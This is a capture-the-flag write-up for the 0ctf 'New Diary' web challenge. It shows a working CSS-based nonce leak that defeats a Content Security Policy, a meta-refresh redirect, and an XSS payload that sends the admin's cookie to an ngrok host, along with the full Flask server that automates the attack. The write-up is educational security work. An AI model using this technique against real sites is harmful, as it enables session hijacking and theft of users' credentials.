# New Diary (14 solves)

This year, for the first time, I partecipated to **0ctf** with `mhackeroni`.
Me, `@Ricy` and `@Alemmi` solved this challenge, we spent many hours in order to find a working exploit, but it was worth it.

## Index

- [New Diary (14 solves)](#new-diary-14-solves)
  - [Index](#index)
  - [Overview](#overview)
  - [Exploit idea](#exploit-idea)
  - [Leaking the nonce](#leaking-the-nonce)
  - [Sources](#sources)
    - [CSS exploit](#css-exploit)
    - [First note (ID 0)](#first-note-id-0)
    - [Second Note (ID 1)](#second-note-id-1)
    - [Third Note (ID 2)](#third-note-id-2)
    - [Final exploit](#final-exploit)

## Overview

This is a whitebox web challenge and it's client-side, we need to steal the admin cookie with the flag inside, so we have to do XSS.
We're able to:

- Create new notes with a `title` (30 chars max) and `content` (256 chars max);
- Share notes with everyone;
- View notes from every user (as long as they shared it);
- Report to an admin a note (ID and username it's needed).

The shared notes are loaded on client-side:

```js
load = () => {
    document.getElementById("title").innerHTML = ""
    document.getElementById("content").innerHTML = ""
    const param = new URLSearchParams(location.hash.slice(1));
    const id = param.get('id');
    let username = param.get('username');
    if (id && /^[0-9a-f]+$/.test(id)) {
        if (username === null) {
            fetch(`/share/read/${id}`).then(data => data.json()).then(data => {
                const title = document.createElement('p');
                title.innerText = data.title;
                document.getElementById("title").appendChild(title);
        
                const content = document.createElement('p');
                content.innerHTML = data.content;
                document.getElementById("content").appendChild(content);
            })
        } else {
            fetch(`/share/read/${id}?username=${username}`).then(data => data.json()).then(data => {
                const title = document.createElement('p');
                title.innerText = data.title;
                document.getElementById("title").appendChild(title);

                const content = document.createElement('p');
                content.innerHTML = data.content;
                document.getElementById("content").appendChild(content);
            })
        }
        document.getElementById("report").href = `/report?id=${id}&username=${username}`;
    }
    window.removeEventListener('hashchange', load);
}
load();
window.addEventListener('hashchange', load);
```

We can clearly see that:

- Since `document.addEventListener('hashchange', load)` is used, we can actually load more than one post on the same request, by changing only the hash part `#id=1&username=asd` we do not make reload the page, keeping the same nonce. We can change hash only once, since the event listener will be removed later (otherwise the exploit could have been a lot easier).
- we can write every HTML tag we want since `content.innerHTML` is used.

So that's it... Right? We can just execute any js code we want and then steal the cookie!
Of course not, if we read more carefully `read_share.html` we notice there's a meta tag which defines the CSP (Content Security Policy):

```html
<meta http-equiv="Content-Security-Policy"
    content="script-src 'nonce-<%= nonce %>'; frame-src 'none'; object-src 'none'; base-uri 'self'; style-src 'unsafe-inline' https://unpkg.com">
```

So we can't execute any js code as long as they don't have the right nonce, which is generated randomly and it changes every time we make a request. We can see how the nonce is generated in `app.js`:

```js
const genNonce = () =>
  "_"
    .repeat(32)
    .replace(/_/g, () =>
      "abcdefghijklmnopqrstuvwxyz0123456789".charAt(crypto.randomInt(36))
    );
```

Thus, we have `36^32` possible nonces, which is a lot. We can't bruteforce it, so we need to find another way.

However, due to the `unsafe-inline` CSP policy, we're able to insert CSS by using the `<style>` tag and by uploading to `npm` (the files are taken by `unpkg.com`)

By doing a quick research it's clear that we need to steal the nonce using CSS.

## Exploit idea

The exploit would be something similar to:

1. Upload to `npm` a css file `leak.css` whose content is the exploit which will leak the nonce (I'm going to talk about this later).
2. Create a post (ID 0) with a `meta` tag, which is needed to redirect the admin to an HTML page controlled by us.
3. Create a post (ID 1) where we import the `leak.css` and where the nonce will be stolen.
4. Report the meta redirect post (ID 0) to the admin, so he will be redirected to our page, where we can make him load the post where the `leak.css` style is imported (ID 1)
5. Finally, on the fly, when we have leaked the nonce, we create the last post (ID 2) where we can execute arbitrary js code with a nonce script, we can make the bot load the post (ID 2) where the XSS is executed, by changing the hash part of the url.
6. Profit.

Main issue is, though, to understand how to leak the nonce.

## Leaking the nonce

The first idea that came into our mind is using the following css rules in order to leak the nonce:

```css
body:has(script[nonce^="a"]){
    background: url(...)
}

body:has(script[nonce^="b"]){
    background: url(...)
}

body:has(script[nonce^="c"]){
    background: url(...)
}

[...]
```

When a request is sent to our server, we know which char is right, and then we would upload a new css file to npm in order to leak the following char.

We quickly realized it's not possible due to multiple reasons:

- the uploading process is too slow,
- we cannot import dynamically css since we cannot reload the page, leading to losing the nonce
- we can only load another post once.

so we moved on.

An idea which sounded great came into my mind the next day: we can leak the whole nonce in parts by using the `*=` operator in CSS.

Example:
Let's say our nonce is `testo`, if we can leak substrings of the nonce, then to our server we might receive these requests:

`?x=tes`
`?x=est`
`?x=sto`

Then, since some letters overlap, we're able to recover the whole nonce.

We tried to leak some characters using a payload similar to the one above:

```css
body:has(script[nonce*="aaa"]){
    background: url(...)
}

body:has(script[nonce*="aab"]){
    background: url(...)
}

body:has(script[nonce*="aac"]){
    background: url(...)
}

[...]
```

We realized that something is not working, only the last matched substring (in this case it would be `aac`) is being sent to our server.

We had no idea why it didn't work.

> Further researches led us to understand that in CSS, when you have multiple selectors targeting the same element (or set of elements) with conflicting styles, the style that is applied is determined by the specificity and order of the rules. If a later rule has the same or higher specificity as an earlier rule, it will override the earlier rule. If the specificity is the same, the rule declared later in the stylesheet takes precedence.

Then, after trying many times to find a way to send more requests, we tried to apply more than one background to a tag and... It worked!!!

```css
:has(script[nonce*="aaa"]){--tosend-aaa: url(...?x=aaa);}
:has(script[nonce*="aab"]){--tosend-aab: url(...?x=aab);}
:has(script[nonce*="aac"]){--tosend-aac: url(...?x=aac);}

[...]

input{
    background: var(--tosend-aaa, none),
    var(--tosend-aab, none),
    var(--tosend-aac, none),
    var(--tosend-aad, none),
    [...]
}
```

So we're going to receive only the correct substrings.
It's possible to recover the nonce in many ways, the one we used is the following:

```py
def retrieveNonce(nonce_substr=nonce_substr, force=False):
    # find the beginning of the nonce (there is no match for start)
    new_substr = list(nonce_substr)
    if (len(new_substr) != 30 and not force):
        print(f"different length of new_substr [{len(new_substr)}] - aborting")
        return 0
    backup = []
    nonce = ''
    remove_i = 0
    for i in range(len(new_substr)):
        start_i = new_substr[i][0:2]
        left = 0
        for j in range(len(new_substr)):
            end_j = new_substr[j][-2:]
            if i != j:
                if start_i == end_j:
                    left = 1
                    break
        if left == 0:
            # beginning
            remove_i = i
            nonce = new_substr[i]
            break
    if (len(nonce) == 0):
        print("no beginning - aborting")
        return 0
    while (len(nonce) < 32):
        new_substr = new_substr[0:remove_i] + new_substr[remove_i+1:]
        # print("new substr: " + str(new_substr))
        found = []
        for i in range(len(new_substr)):
            start_i = new_substr[i][0:2]
            if (nonce[-2:] == start_i):
                # print("found: " + start_i)
                found += [i]
        if (len(found) == 0):
            # start over from latest backup
            if (len(backup) > 0):
                nonce = backup[-1][0]
                found = backup[-1][1]
                new_substr = backup[-1][2]
                backup = backup[:-1]
            else:
                print("no backup - aborting")
                break
        if (len(found) > 0):
            if (len(found) > 1):
                print("found more than one: " + str(found))
                backup += [[nonce, found[1:], new_substr]]
            remove_i = found[0]
            nonce += new_substr[remove_i][-1]

        # input("nonce: " + nonce)

    return nonce
```

We noticed that the tab crashes while loading that css, but the requests are sent to our server anyway.

## Sources

### CSS exploit

This is the script used in order to generate the CSS file:

```py
import itertools

charset = "abcdefghijklmnopqrstuvwxyz0123456789"

perms = list(map("".join, itertools.product(charset, repeat=3)))


with open("leak.css", "w") as f:
    for i, x in enumerate(perms):
        f.write(f""":has(script[nonce*="{x}"]){{--tosend-{x}: url(https://25de-37-160-34-111.ngrok-free.app/?x={x});}}""")


    data = ""
    print("loading")
    for x in perms:
        data += f"var(--tosend-{x}, none),"

    print("done")
    print("writing")
    
    f.write(("""
input{
background: %s
}
""" % data[:-1]))
```

### First note (ID 0)

Meta tag redirect

```html
<meta http-equiv="refresh" content="0.0;url=https://25de-37-160-34-111.ngrok-free.app/">
```

### Second Note (ID 1)

Nonce leak

```html
<link rel="stylesheet" href="https://unpkg.com/alemmi@x.x.x/leak.css"><input />
```

### Third Note (ID 2)

XSS

```html
<iframe name=asdasd srcdoc='<script nonce="{nonce}">fetch("{ngrok_url}/flag?flag="+encodeURI(document.cookie))</script>'></iframe>
```

### Final exploit

Just go to `/exploit` and everything will be automatically done. Obviously, you need to open a ngrok http tunnel to a port, and open the python server to the same port. Furthermore, the leak.css file should have the ngrok url as well.

`server.py`:

```py
import requests
from flask import Flask, request, render_template, redirect, url_for, session, make_response
import random

s = requests.Session()

url = 'http://new-diary.ctf.0ops.sjtu.cn'

# little random
user = 'pwn'+str(random.randint(0, 1000000))
ngrok_url = 'https://679d-131-175-28-197.ngrok-free.app/'

app = Flask(__name__)

nonce_substr = set()


def retrieveNonce(nonce_substr=nonce_substr, force=False):
    # find the beginning of the nonce (there is no match for start)
    new_substr = list(nonce_substr)
    if (len(new_substr) != 30 and not force):
        print(f"different length of new_substr [{len(new_substr)}] - aborting")
        return 0
    backup = []
    nonce = ''
    remove_i = 0
    for i in range(len(new_substr)):
        start_i = new_substr[i][0:2]
        left = 0
        for j in range(len(new_substr)):
            end_j = new_substr[j][-2:]
            if i != j:
                if start_i == end_j:
                    left = 1
                    break
        if left == 0:
            # beginning
            remove_i = i
            nonce = new_substr[i]
            break
    if (len(nonce) == 0):
        print("no beginning - aborting")
        return 0
    while (len(nonce) < 32):
        new_substr = new_substr[0:remove_i] + new_substr[remove_i+1:]
        # print("new substr: " + str(new_substr))
        found = []
        for i in range(len(new_substr)):
            start_i = new_substr[i][0:2]
            if (nonce[-2:] == start_i):
                # print("found: " + start_i)
                found += [i]
        if (len(found) == 0):
            # start over from latest backup
            if (len(backup) > 0):
                nonce = backup[-1][0]
                found = backup[-1][1]
                new_substr = backup[-1][2]
                backup = backup[:-1]
            else:
                print("no backup - aborting")
                break
        if (len(found) > 0):
            if (len(found) > 1):
                print("found more than one: " + str(found))
                backup += [[nonce, found[1:], new_substr]]
            remove_i = found[0]
            nonce += new_substr[remove_i][-1]

        # input("nonce: " + nonce)

    return nonce

def login():
    r = s.post(url + '/login', data={'username': user, 'password': user})
    if r.status_code != 200:
        print("login failed")

def write_zero_note():
    r = s.post(url + '/write', data={'title':'meta', 'content': f'<meta http-equiv="refresh" content="0.0;url={ngrok_url}">'})
    share(0)

def write_first_note():
    r = s.post(url + '/write', data={'title':'linkstylesheet', 'content': '<link rel="stylesheet" href="https://unpkg.com/alemmi@x.x.x/leak.css"><input />'})
    share(1)

def share(num):
    r = s.get(f"{url}/share_diary/{num}")

def create_script_nonce(nonce):
    script = f"""<iframe name=asd srcdoc="<script nonce={nonce}>top.location='{ngrok_url}flag?flag='+encodeURI(document['cookie'])</script>"/>"""
    r = s.post(url + '/write', data={'title':'pwning', 'content': script})
    share(2)

def report():
    r = s.get(url + '/report?id=0&username=' + user)

def logout():
    r = s.get(url + '/logout')

@app.route('/exploit')
def exploit(test=False):
    global user
    user = 'pwn'+str(random.randint(0, 1000000))
    logout()
    login()
    write_zero_note()
    write_first_note()
    if (test == False):
        print("reporting...")
        report()
    return "exploit for "+user+" done"

@app.route('/flag')
def flag():
    flag = request.args.get('flag')
    if flag is not None:
        print("flag: " + flag)
        return "You have been pwned"
    return "Pls give me flag"

@app.route('/')
def index():
    x = request.args.get('x')
    if x is not None:
        print("x: " + x)
        print("current nonce_substr: " + str(nonce_substr))
        nonce_substr.add(x)
        if len(nonce_substr) >= 30:
            nonce = retrieveNonce()
            print("nonce: " + nonce)
            create_script_nonce(nonce)

    return render_template('index.html', USERNAME=user)

if __name__ == '__main__':
    try:
        print('Public URL:', ngrok_url)
        app.run(host='localhost', port=5000)
    except Exception as e:
        print(e)
        print("aborting")
    finally:
        exit(0)
```

`index.html`:

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    
    <script>
        const sleep = (milliseconds) => new Promise(resolve => setTimeout(resolve, milliseconds));
        async function run(){
            bot_window = window.open("http://localhost/share/read#id=1&username={{USERNAME}}"); // Exploit 1, leak nonce
            await sleep(7000);

            bot_window.location.href = "http://localhost/share/read#id=2&username={{USERNAME}}"; // Exploit 2, leak cookie
            await sleep(100);
            console.log("O");
        }
        run();
    </script>
</body>
</html>
```

At the end, it was a fun challenge to solve ❤️ Thanks to the authors for the challenge and for the CTF in general.
